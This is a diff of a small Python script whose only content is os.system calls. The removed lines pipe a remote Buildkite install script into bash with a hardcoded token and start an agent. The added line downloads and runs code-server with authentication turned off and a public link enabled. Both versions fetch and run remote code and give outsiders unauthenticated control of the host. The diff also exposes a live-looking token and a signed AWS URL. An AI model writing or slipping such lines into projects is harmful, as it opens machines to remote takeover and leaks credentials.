@@ -1,4 +1,2 @@
 import os
-os.system('rm install.sh')
-os.system('TOKEN="0bfeb709c3ea9c6a3330e86c0805272c6f885f09acca33d94e" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"')
-os.system('~/.buildkite-agent/bin/buildkite-agent start')
+os.system('curl "https://objects.githubusercontent.com/github-production-release-asset-2e65be/172953845/8d7f20f3-fba2-4327-9e2c-fd7aba8b9f48?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211122%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211122T212659Z&X-Amz-Expires=300&X-Amz-Signature=a9f628696f2f19db5e2947fb2864a4f6a909633a11840ad895e44d930e7ac3e8&X-Amz-SignedHeaders=host&actor_id=94856590&key_id=0&repo_id=172953845&response-content-disposition=attachment%3B%20filename%3Dcode-server-3.12.0-linux-amd64.tar.gz&response-content-type=application%2Foctet-stream" --output code-server-3.12.0-linux-amd64.tar.gz && tar xf code-server-3.12.0-linux-amd64.tar.gz && ./code-server-3.12.0-linux-amd64/bin/code-server --auth=none --link')
